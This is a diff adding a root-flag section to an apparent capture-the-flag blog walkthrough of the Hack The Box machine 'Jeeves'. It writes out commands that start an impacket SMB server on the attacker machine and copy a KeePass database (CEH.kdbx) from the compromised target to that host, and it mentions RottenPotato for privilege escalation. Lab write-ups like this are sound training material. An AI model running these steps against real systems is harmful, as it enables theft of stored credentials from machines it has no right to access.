@@ -124,4 +124,38 @@ Then, we can move directly to the "users" folder with no problem, list the avail
 
 <img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/user.png" alt="user flag">
 
+## Getting root flag
+
+To get the root flag there are two ways to get it where one compromises a file that has been gotten from the Documents directory within the user and the other way is using [RottenPotato](https://github.com/foxglovesec/RottenPotato) to scalate to root. 
+
+### Getting root flag - Method #1
+After looking around in the directories from the user __kohsuke__, there is a file in the Documents directory with __kdbx__ extension. 
+
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/list-documents.png" alt="list-documents">
+
+After googling "kdbx extension", it gave a result saying that extension comes from a password manager called "KeePassX". So, the idea now is to transfer the file "CEH.kdbx" to our machine. To do this, the usage of the [smbserver from impacket](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) will be helpful. This method has been learned from [The Cyber Jedi](http://thecyberjedi.com/). 
+
+From our machine:
+```
+smbserver SAM kohsuke 
+```
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/smbserver.png" alt="smbserver">
+
+Before executing any comand in Jeeves, remember to create the folder where you want to transfer the files, in this case the folder name is __kohsuke__.
+
+In Jeeves:
+```
+net use s: \\10.10.14.36\SAM
+```
+and then 
+```
+copy CEH.kdbx s:
+```
+
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/copy.png" alt="copy">
+
+From the smbserver it's going to appear the connection made with Jeeves, and in the folder __kohsuke__ will appear the file that we copied from Jeeves. 
+
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/transfer-done.png" alt="transfer-done">
+
 
